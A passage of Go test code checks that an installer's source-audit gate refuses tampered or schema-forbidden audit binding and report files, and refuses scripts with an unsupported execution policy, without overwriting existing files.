	}
	rows = append(rows, nullRows...)
	rows = append(rows, wrongTypes...)
	for _, tc := range rows {
		t.Run(tc.name, func(t *testing.T) {
			restore(t)
			tc.mutate(t)
			tamperedObject, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			tamperedReport, err := os.ReadFile(reportPath)
			if err != nil {
				t.Fatal(err)
			}
			result := draftProjectResult(cfg, project, home, false)
			if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
				t.Fatalf("%s was NOT refused on the mutating path: %+v", tc.name, result)
			}
			other := draftProjectResult(cfg, project, home, true)
			if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
				t.Fatalf("%s was NOT refused on the read-only path: %+v", tc.name, other)
			}
			afterObject, err := os.ReadFile(objectPath)
			if err != nil {
				t.Fatal(err)
			}
			if string(tamperedObject) != string(afterObject) {
				t.Fatalf("%s existing binding was overwritten", tc.name)
			}
			afterReport, err := os.ReadFile(reportPath)
			if err != nil {
				t.Fatal(err)
			}
			if string(tamperedReport) != string(afterReport) {
				t.Fatalf("%s existing report was overwritten", tc.name)
			}
		})
	}
	restore(t)
	assertGatePassed(t, draftProjectResult(cfg, project, home, true))
	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
}

// An enforced script command is refused by the pre-existing scriptpolicy
// gate during validation, before the source-audit binding and long before
// any cache or compiler work.
func TestDraftAuditEnforcedScriptRefused(t *testing.T) {
	payload := `{"schema_version":2,"sources":{"s":{"path":"."}},"skills":[{"from":"s","directory":"skills","include":["tool"]}]}`
	project, home, _ := draftProject(t, payload, map[string]string{"skills/tool": "tool"})
	dir := filepath.Join(project, "skills", "tool")
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "scripts", "tool"), []byte("#!/bin/sh\necho tool\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	manifest := map[string]any{
		"schema_version": 8,
		"capabilities": map[string]any{
			"env_read": []string{}, "exec": "none", "filesystem": "repo",
			"network": "none", "secrets": "none",
		},
		"runtime_roots": []string{"scripts"},
		"commands": map[string]any{
			"tool": map[string]any{
				"type": "script", "unix_path": "scripts/tool", "win_path": "scripts/tool",
				"execution_policy": "script-worker-v1", "interpreter": "python3-v1",
			},
		},
	}
	encoded, _ := json.MarshalIndent(manifest, "", "  ")
	if err := os.WriteFile(filepath.Join(dir, "agent-skill.json"), encoded, 0o644); err != nil {
		t.Fatal(err)
	}
	resolveDraftForInstall(t, project, home, payload)
	cfg := draftTestConfig(home, t.TempDir())
	result := draftProjectResult(cfg, project, home, true)
	if result.Status != "failed" ||
		!strings.Contains(strings.Join(result.Errors, ";"), "script_execution_policy_unsupported") {
		t.Fatalf("enforced result = %+v, want scriptpolicy refusal", result)
	}
}

func TestReviewClosedPackageShape(t *testing.T) {
 project, home, _ := strictLocalProject(t, "")
 cfg := draftAuditConfig(home)
 assertGatePassed(t, draftProjectResult(cfg, project, home, false))
 objectPath, reportPath := auditBindingPaths(t, home)
 baseObject, _ := os.ReadFile(objectPath)
 baseReport, _ := os.ReadFile(reportPath)
 for _, target := range []string{"object", "report"} {
  for _, field := range []string{"commit", "repository", "source", "directory"} {
   for _, value := range []any{nil, ""} {
    if field == "commit" && value != nil { continue }
    label := "null"; if value != nil { label = "empty" }
    t.Run(target+"/"+field+"/"+label, func(t *testing.T) {
     if err := os.WriteFile(objectPath, baseObject, 0600); err != nil { t.Fatal(err) }
     if err := os.WriteFile(reportPath, baseReport, 0600); err != nil { t.Fatal(err) }
     payload := baseObject; path := objectPath
     if target == "report" { payload = baseReport; path = reportPath }
     var doc map[string]any
     if err := json.Unmarshal(payload, &doc); err != nil { t.Fatal(err) }
     doc["package"].(map[string]any)[field] = value
     forged, err := json.Marshal(doc); if err != nil { t.Fatal(err) }
     if err := os.WriteFile(path, forged, 0600); err != nil { t.Fatal(err) }
     if target == "report" { rewriteAuditObject(t, objectPath, map[string]any{"evidence_sha256": audit.EvidenceDigest(forged)}) }
     for _, dry := range []bool{true, false} {
      result := draftProjectResult(cfg, project, home, dry)
      if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
       t.Errorf("schema-forbidden package field admitted (dryRun=%v): %+v", dry, result)
      }
     }
    })
   }
  }
 }
}
